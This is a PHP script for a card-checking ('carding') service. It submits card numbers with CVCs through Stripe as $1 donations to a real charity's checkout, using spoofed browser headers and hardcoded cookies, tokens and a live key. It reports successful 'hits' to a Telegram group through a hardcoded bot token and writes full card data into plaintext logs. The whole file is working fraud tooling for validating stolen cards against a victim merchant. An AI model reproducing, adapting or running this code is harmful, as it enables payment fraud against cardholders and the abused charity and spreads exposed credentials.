<?php
header('Content-Type: application/json');

// Enable error logging
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/paypal0.1$_debug.log');

// Include cron_sync.php for validateApiKey
require_once __DIR__ . '/refresh.php';

// Start session for user authentication
session_start([
    'cookie_secure' => isset($_SERVER['HTTPS']),
    'cookie_httponly' => true,
    'use_strict_mode' => true,
]);

// Check if user is authenticated
if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access'];
    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 403: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

// Validate API key
 $validation = validateApiKey();
if (!$validation['valid']) {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

 $expectedApiKey = $validation['response']['apiKey'];
 $providedApiKey = $_SERVER['HTTP_X_API_KEY'] ?? '';
if ($providedApiKey !== $expectedApiKey) {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Optional file-based logging for debugging
 $log_file = __DIR__ . '/paypal0.1$_debug.log';
function log_message($message) {
    global $log_file;
    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
}

// Function to check for 3DS responses
function is3DAuthenticationResponse($response) {
    $responseUpper = strtoupper($response);
    return strpos($responseUpper, '3D_AUTHENTICATION') !== false ||
           strpos($responseUpper, '3DS') !== false ||
           strpos($responseUpper, 'THREE_D_SECURE') !== false ||
           strpos($responseUpper, 'REDIRECT') !== false;
}

// Function to format response (remove status prefix and brackets)
function formatResponse($response) {
    $statusPrefixPattern = '/^(APPROVED|CHARGED|DECLINED|3DS)\s*\[(.*)\]$/i';
    if (preg_match($statusPrefixPattern, $response, $match)) {
        return $match[2];
    }
    $bracketsPattern = '/^\[(.*)\]$/';
    if (preg_match($bracketsPattern, $response, $match)) {
        return $match[1];
    }
    return $response;
}

// Function to send Telegram notification
function sendTelegramNotification($card_details, $status, $response) {
    // Load Telegram Bot Token from environment (secure storage)
    $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
    $chat_id = '-1003204998888'; // Your group chat ID
    $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
    $site_link = 'https://cxchk.site';

    // Skip 3DS responses
    if (is3DAuthenticationResponse($response)) {
        log_message("Skipping Telegram notification for 3DS response: $response");
        return;
    }

    // Get user info from session
    $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
    $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
    $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
    $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
    $gateway = 'Paypal 0.1$'; // Hardcoded for this gateway
    $formatted_response = formatResponse($response);

    // Construct Telegram message
    $message = "<b>✦━━[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃! ]━━✦</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <b>$status $status_emoji</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ $gateway</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
               "<b>――――――――――――</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>";

    // Send to Telegram
    $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $payload = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true  // Added to prevent link previews
    ];

    $ch = curl_init($telegram_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Changed to true for security
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Added timeout
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);

    if ($http_code !== 200 || !$result) {
        log_message("Failed to send Telegram notification for $card_details: HTTP $http_code, Error: $curl_error, Response: " . ($result ?: 'No response'));
    } else {
        log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
    }
}

// Check if card details are provided
if (!isset($_POST['card']) || !is_array($_POST['card'])) {
    echo json_encode(['status' => 'ERROR', 'message' => 'Card details not provided']);
    exit;
}

// Get card details from POST request
 $cardNumber = $_POST['card']['number'] ?? '';
 $expMonth = $_POST['card']['exp_month'] ?? '';
 $expYear = $_POST['card']['exp_year'] ?? '';
 $cvc = $_POST['card']['cvc'] ?? '';

// Validate card details
if (empty($cardNumber) || empty($expMonth) || empty($expYear) || empty($cvc)) {
    $errorMsg = ['status' => 'DECLINED', 'message' => 'Missing card details', 'response' => 'MISSING_CARD_DETAILS'];
    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error 400: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

// Format year to 4 digits if needed
if (strlen($expYear) == 2) {
    $expYear = '20' . $expYear;
}

// Log request details
 $logMsg = date('Y-m-d H:i:s') . ' Request: Card=' . $cardNumber . '|' . $expMonth . '|' . $expYear . '|' . $cvc . ', Headers=' . print_r(getallheaders(), true);
file_put_contents(__DIR__ . '/stripe1_debug.log', $logMsg . PHP_EOL, FILE_APPEND);

// Initialize cookie jar for session continuity
 $cookieJar = tempnam(sys_get_temp_dir(), 'cookies');

// Function to fetch a new cart token
function fetchCartToken($cookieJar) {
    $cartHeaders = [
        'authority: www.onamissionkc.org',
        'accept: application/json',
        'accept-encoding: gzip, deflate, br, zstd',
        'accept-language: en-US,en;q=0.9',
        'content-type: application/json',
        'origin: https://www.onamissionkc.org',
        'referer: https://www.onamissionkc.org/donate-now',
        'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile: ?1',
        'sec-ch-ua-model: "Nexus 5"',
        'sec-ch-ua-platform: "Android"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    ];

    $cartData = json_encode([
        'amount' => [
            'value' => 100,
            'currencyCode' => 'USD',
        ],
        'donationFrequency' => 'ONE_TIME',
        'feeAmount' => null,
    ]);

    $ch = curl_init('https://www.onamissionkc.org/api/v1/fund-service/websites/62fc11be71fa7a1da8ed62f8/donations/funds/6acfdbc6-2deb-42a5-bdf2-390f9ac5bc7b');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $cartHeaders);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $cartData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $cartResponse = curl_exec($ch);
    $cartResult = json_decode($cartResponse, true);
    $cartHttpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);

    if ($cartHttpCode != 200 || !isset($cartResult['redirectUrlPath'])) {
        $errorMsg = $cartResult['error']['message'] ?? ($curlError ?: 'Failed to create new cart');
        file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Cart Error: ' . $errorMsg . PHP_EOL, FILE_APPEND);
        return ['success' => false, 'message' => $errorMsg];
    }

    preg_match('/cartToken=([^&]+)/', $cartResult['redirectUrlPath'], $matches);
    if (!isset($matches[1])) {
        file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error: Failed to extract cart token' . PHP_EOL, FILE_APPEND);
        return ['success' => false, 'message' => 'Unable to extract cart token'];
    }

    return ['success' => true, 'cartToken' => $matches[1]];
}

// First API call to create payment method
 $headers = [
    'authority: api.stripe.com',
    'accept: application/json',
    'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
];

 $data = http_build_query([
    'billing_details' => [
        'address' => [
            'city' => 'Oakford',
            'country' => 'US',
            'line1' => 'Siles Avenue',
            'line2' => '',
            'postal_code' => '19053',
            'state' => 'PA',
        ],
        'name' => 'Geroge Washintonne',
        'email' => 'grogeh@gmail.com',
    ],
    'type' => 'card',
    'card' => [
        'number' => $cardNumber,
        'cvc' => $cvc,
        'exp_year' => $expYear,
        'exp_month' => $expMonth,
    ],
    'allow_redisplay' => 'unspecified',
    'payment_user_agent' => 'stripe.js/5445b56991; stripe-js-v3/5445b56991; payment-element; deferred-intent',
    'referrer' => 'https://www.onamissionkc.org',
    'time_on_page' => '145592',
    'client_attribution_metadata' => [
        'client_session_id' => '22e7d0ec-db3e-4724-98d2-a1985fc4472a',
        'merchant_integration_source' => 'elements',
        'merchant_integration_subtype' => 'payment-element',
        'merchant_integration_version' => '2021',
        'payment_intent_creation_flow' => 'deferred',
        'payment_method_selection_flow' => 'merchant_specified',
        'elements_session_config_id' => '7904f40e-9588-48b2-bc6b-fb88e0ef71d5',
    ],
    'guid' => '18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd',
    'muid' => '3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48',
    'sid' => '9d45db81-2d1e-436a-b832-acc8b6abac4814eb67',
    'key' => 'pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e',
    '_stripe_account' => 'acct_1LwocDFHMGxIu0Ep',
]);

 $ch = curl_init('https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
 $response = curl_exec($ch);
 $apx = json_decode($response, true);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 $curlError = curl_error($ch);
curl_close($ch);

if ($httpCode != 200 || !isset($apx['id'])) {
    $errorMsg = $apx['error']['message'] ?? ($curlError ?: 'Unknown error');
    $responseMsg = [
        'status' => 'DECLINED', 
        'message' => 'Your card was declined', 
        'response' => $errorMsg,
        'payment_method_id' => null
    ];
    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Payment Method Error: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($responseMsg);
    exit;
}

 $pid = $apx['id'];

// Function to make merchant API call
function makeMerchantApiCall($cartToken, $pid, $cookieJar) {
    $cookies = 'crumb=BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1; ' .
               'ss_cvr=b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1; ' .
               'ss_cvt=1760724937850; ' .
               '__stripe_mid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48; ' .
               '__stripe_sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67';

    $headers = [
        'authority: www.onamissionkc.org',
        'accept: application/json, text/plain, */*',
        'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
        'content-type: application/json',
        'origin: https://www.onamissionkc.org',
        'referer: https://www.onamissionkc.org/checkout?cartToken=' . $cartToken,
        'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile: ?1',
        'sec-ch-ua-platform: "Android"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-csrf-token: BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',
    ];

    $jsonData = json_encode([
        'email' => 'grogeh@gmail.com',
        'subscribeToList' => false,
        'shippingAddress' => [
            'id' => '',
            'firstName' => '',
            'lastName' => '',
            'line1' => '',
            'line2' => '',
            'city' => '',
            'region' => 'NY',
            'postalCode' => '',
            'country' => '',
            'phoneNumber' => '',
        ],
        'createNewUser' => false,
        'newUserPassword' => null,
        'saveShippingAddress' => false,
        'makeDefaultShippingAddress' => false,
        'customFormData' => null,
        'shippingAddressId' => null,
        'proposedAmountDue' => [
            'decimalValue' => '1',
            'currencyCode' => 'USD',
        ],
        'cartToken' => $cartToken,
        'paymentToken' => [
            'stripePaymentTokenType' => 'PAYMENT_METHOD_ID',
            'token' => $pid,
            'type' => 'STRIPE',
        ],
        'billToShippingAddress' => false,
        'billingAddress' => [
            'id' => '',
            'firstName' => 'Davide',
            'lastName' => 'Washintonne',
            'line1' => 'Siles Avenue',
            'line2' => '',
            'city' => 'Oakford',
            'region' => 'PA',
            'postalCode' => '19053',
            'country' => 'US',
            'phoneNumber' => '+1361643646',
        ],
        'savePaymentInfo' => false,
        'makeDefaultPayment' => false,
        'paymentCardId' => null,
        'universalPaymentElementEnabled' => true,
    ]);

    $ch = curl_init('https://www.onamissionkc.org/api/2/commerce/orders');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
    curl_setopt($ch, CURLOPT_COOKIE, $cookies);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    $result = json_decode($response, true);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);

    return ['response' => $result, 'httpCode' => $httpCode, 'curlError' => $curlError];
}

// Attempt merchant API call with retry on errors
 $maxRetries = 3;
 $retryCount = 0;
 $cartResult = fetchCartToken($cookieJar);

if (!$cartResult['success']) {
    $responseMsg = [
        'status' => 'ERROR', 
        'message' => 'Unable to create new cart', 
        'response' => $cartResult['message'],
        'payment_method_id' => $pid
    ];
    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Cart Error: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($responseMsg);
    exit;
}

 $cartToken = $cartResult['cartToken'];

while ($retryCount < $maxRetries) {
    $merchantResult = makeMerchantApiCall($cartToken, $pid, $cookieJar);
    $apx1 = $merchantResult['response'];
    $httpCode = $merchantResult['httpCode'];
    $curlError = $merchantResult['curlError'];

    if ($httpCode == 200 && !isset($apx1['failureType'])) {
        // Success
        unlink($cookieJar);
        $responseMsg = [
            'status' => 'CHARGED',
            'message' => 'Your card has been charged $1.00 successfully.',
            'response' => "CHARGED",
            'payment_method_id' => $pid
        ];
        file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Success: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
        echo json_encode($responseMsg);
        exit;
    }

    // Handle specific errors
    if (isset($apx1['failureType']) && in_array($apx1['failureType'], ['CART_ALREADY_PURCHASED', 'CART_MISSING', 'STALE_USER_SESSION'])) {
        file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . " Error: {$apx1['failureType']}, retrying with new cart token" . PHP_EOL, FILE_APPEND);
        $cartResult = fetchCartToken($cookieJar);
        if (!$cartResult['success']) {
            $responseMsg = [
                'status' => 'ERROR', 
                'message' => 'Unable to create new cart', 
                'response' => $cartResult['message'],
                'payment_method_id' => $pid
            ];
            file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Cart Error: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
            echo json_encode($responseMsg);
            exit;
        }
        $cartToken = $cartResult['cartToken'];
        $retryCount++;
        continue;
    }

    // Other failures
    unlink($cookieJar);
    $errorMsg = $apx1['failureType'] ?? ($curlError ?: 'Unknown error');
    $responseMsg = [
        'status' => 'DECLINED',
        'message' => 'Your card was declined',
        'response' => "PAYMENT_DECLINED [$errorMsg]",
        'payment_method_id' => $pid
    ];
    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($responseMsg);
    exit;
}

// Max retries reached
unlink($cookieJar);
 $responseMsg = [
    'status' => 'ERROR',
    'message' => 'Unable to process payment due to persistent errors',
    'response' => "MAX_RETRIES_EXCEEDED $cardNumber|$expMonth|$expYear|$cvc",
    'payment_method_id' => $pid
];
file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
echo json_encode($responseMsg);
?>
